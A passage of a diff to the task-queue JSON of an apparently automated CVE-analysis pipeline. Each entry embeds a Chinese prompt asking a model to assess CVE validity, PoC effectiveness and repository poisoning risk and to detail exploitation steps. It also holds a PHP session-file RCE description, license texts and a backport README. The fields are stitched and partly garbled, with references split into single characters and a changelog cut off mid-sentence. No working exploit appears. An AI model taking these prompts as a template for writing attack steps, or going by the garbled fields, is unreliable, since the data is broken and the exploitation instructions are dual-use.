current token-forwarding\nexploit is claimed.\n\n## Presentation\n\n- Replaced the long horizontal “headline chain” with a compact vertical\n  trust-boundary map.\n- Replaced the original abstract eight-marker hero with a structured three-zone\n  cover. The cover is visual orientation; the trust-boundary map and advisory index\n  remain the authoritative technical explanation.\n- Replaced “upgrade guidance” with “mitigation guidance” because no later\n  upstream release was known at disclosure time.\n\n## v1.0.2\n\nMetadata release of 29 September 2026. The author is named in CITATION.cff and README.md as Alex Gercog (playb0t), and the five CVE records MITRE published on 24 September 2026 are added to the Classification blocks of F-01, F-02, F-04, F-08 and F-11, with CISA's scores where assigned; the F-04 CVSS line now points to CISA's assessment. No evidence class, version range or correction text changed. The v1.0.1 paths referenced by the CVE records are unchanged. Between the two tags the README's Mermaid map was also replaced by `assets/mcp-remote-trust-boundary-map.png` with two explanatory sentences (commit 96586453, 31 July 2026), and the advisory-index paragraph and the IMPORTANT note were reworded to state which advisories carry records.\n\n## After v1.0.2 (main, 29 September 2026)\n\nWording fixes on the main branch after the v1.0.2 tag, none touching evidence, ranges or the tagged paths: the README calls `0.1.38` the release current at disclosure and dates the upstream-state section, adding the later releases `0.1.39` through `0.14.3` and the repository move; the sentence under the advisory index now states that the CVSS values on the CVE lines are CISA-ADP assessments reported as published; CITATION.cff drops the invalid top-level `type: report` (CFF 1.2.0 allows only software or dataset there) and carries the report citation in `preferred-citation`; TIMELINE.md gains the 24 and 29 September rows; METHODOLOGY.md dates its unchanged-upstream statement; the CVSS lines of F-01, F-02 and F-08 use the F-04 wording; F-11 names the `v1.0.0` text as the claim its controls refute.\n\nLater on 29 September 2026 the README gained a dated «Registry status» section: the CISA-ADP scores with their dates, the NVD status, the state of the five records in the GitHub Advisory Database and in OSV, the empty structured `affected`\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 1,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1795085846.064296,
+    "last_attempt": 1795138418.5629544,
+    "next_attempt": 1795138428.9016528,
+    "metadata": {},
+    "task_id": "task_CVE-2026-51994_1795085846",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-126714",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-126714\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"Partially overwritten session files can lead to remote code execution.\\n\\nThe files session save handler, which is the default, writes updated session data into the existing session file without first clearing it. If a write is interrupted, the file can contain the beginning of the new session followed by the end of the old one, and bytes of an ordinary string can later be unserialized as objects. An attacker who can influence the session data, for example through session upload progress, and interrupt a write at a suitable point may inject objects, which can lead to code execution when the application contains a suitable gadget chain. Session data can also be corrupted.\\n\\nThis issue affects PHP versions before 8.2.36, 8.3.* before 8.3.37, 8.4.* before 8.4.28 and 8.5.* before 8.5.13.\", \"\\u6807\\u9898: CVE-2026-126714 \\u6f0f\\u6d1e\"], \"published_date\": \"2026-11-19T15:17:26.167\", \"last_modified_date\": \"2026-11-19T21:45:08.637\", \"cvss_score\": null, \"severity\": null, \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"p\", \"h\", \"p\", \"/\", \"p\", \"h\", \"p\", \"-\", \"s\", \"r\", \"c\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"G\", \"H\", \"S\", \"A\", \"-\", \"f\", \"m\", \"2\", \"m\", \"-\", \"f\", \"j\", \"f\", \"5\", \"-\", \"v\", \"3\", \"c\", \"p\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"b\", \"u\", \"g\", \"z\", \"i\", \"l\", \"l\", \"a\", \".\", \"s\", \"u\", \"s\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"h\", \"o\", \"w\", \"_\", \"b\", \"u\", \"g\", \".\", \"c\", \"g\", \"i\", \"?\", \"i\", \"d\", \"=\", \"1\", \"2\", \"9\", \"0\", \"6\", \"9\", \"0\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"d\", \"e\", \"p\", \"t\", \"h\", \"f\", \"i\", \"r\", \"s\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"p\", \"h\", \"p\", \"A\", \"f\", \"t\", \"e\", \"r\", \"S\", \"h\", \"e\", \"l\", \"l\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"e\", \"m\", \"g\", \"r\", \"e\", \"p\", \"/\", \"d\", \"e\", \"t\", \"e\", \"c\", \"t\", \"i\", \"o\", \"n\", \"-\", \"s\", \"c\", \"r\", \"i\", \"p\", \"t\", \"s\", \"/\", \"p\", \"u\", \"l\", \"l\", \"/\", \"1\", \"4\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"u\", \"b\", \"u\", \"n\", \"t\", \"u\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"1\", \"2\", \"6\", \"7\", \"1\", \"4\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/146b7ce2bb189fb374c1afd76908ddfb/LICENSE\n---\nMIT License\n\nCopyright (c) 2026 Oleksii Molchanov\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/146b7ce2bb189fb374c1afd76908ddfb/LICENSE.PHP\n---\n--------------------------------------------------------------------\n                  The PHP License, version 3.01\nCopyright (c) 1999 - 2021 The PHP Group. All rights reserved.\n--------------------------------------------------------------------\n\nRedistribution and use in source and binary forms, with or without\nmodification, is permitted provided that the following conditions\nare met:\n\n  1. Redistributions of source code must retain the above copyright\n     notice, this list of conditions and the following disclaimer.\n\n  2. Redistributions in binary form must reproduce the above copyright\n     notice, this list of conditions and the following disclaimer in\n     the documentation and/or other materials provided with the\n     distribution.\n\n  3. The name \"PHP\" must not be used to endorse or promote products\n     derived from this software without prior written permission. For\n     written permission, please contact group@php.net.\n\n  4. Products derived from this software may not be called \"PHP\", nor\n     may \"PHP\" appear in their name, without prior written permission\n     from group@php.net.  You may indicate that your software works in\n     conjunction with PHP by saying \"Foo for PHP\" instead of calling\n     it \"PHP Foo\" or \"phpfoo\"\n\n  5. The PHP Group may publish revised and/or new versions of the\n     license from time to time. Each version will be given a\n     distinguishing version number.\n     Once covered code has been published under a particular version\n     of the license, you may always continue to use it under the terms\n     of that version. You may also choose to use such covered code\n     under the terms of any subsequent version of the license\n     published by the PHP Group. No one other than the PHP Group has\n     the right to modify the terms applicable to covered code created\n     under this License.\n\n  6. Redistributions of any form whatsoever must retain the following\n     acknowledgment:\n     \"This product includes PHP software, freely available from\n     <http://www.php.net/software/>\".\n\nTHIS SOFTWARE IS PROVIDED BY THE PHP DEVELOPMENT TEAM ``AS IS'' AND\nANY EXPRESSED OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\nPARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE PHP\nDEVELOPMENT TEAM OR ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT,\nINDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)\nHOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\nSTRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED\nOF THE POSSIBILITY OF SUCH DAMAGE.\n\n--------------------------------------------------------------------\n\nThis software consists of voluntary contributions made by many\nindividuals on behalf of the PHP Group.\n\nThe PHP Group can be contacted via Email at group@php.net.\n\nFor more information on the PHP Group and the PHP project,\nplease see <http://www.php.net>.\n\nPHP includes the Zend Engine, freely available at\n<http://www.zend.com>.\n\n\n---\n/tmp/146b7ce2bb189fb374c1afd76908ddfb/README.md\n---\n# php2shell-eol-backport\n\nUnofficial backport of the official fixes for **CVE-2026-109618** and **CVE-2026-109619** (\"php2shell\") and,\nsince release 2, **CVE-2026-126714** (\"phpAfterShell\") and, since release 3, all other issues of the PHP security\nreleases of 19 November 2026 that apply to PHP 5 to the end-of-life PHP packages of **Enterprise Linux 6 and 7**:\n`php-5.3.3` (RHEL / CentOS / Oracle Linux 6) and `php-5.4.16` (RHEL / CentOS / Oracle Linux / Scientific Linux 7).\nWhich of these CVEs affect PHP 5 is explained in [How serious is this on PHP\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
     "retry_count": 0,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": null,
     "last_error": null,
-    "created_at": 1795085846.064296,
+    "created_at": 1795138427.0237625,
     "last_attempt": 0,
-    "next_attempt": 1795085851.769219,
+    "next_attempt": 1795138432.9043367,
     "metadata": {},
-    "task_id": "task_CVE-2026-51994_1795085846",
+    "task_id": "task_CVE-2026-126714_1795138427",
     "required_result_fields": [
       "poc_available",
       "condition",
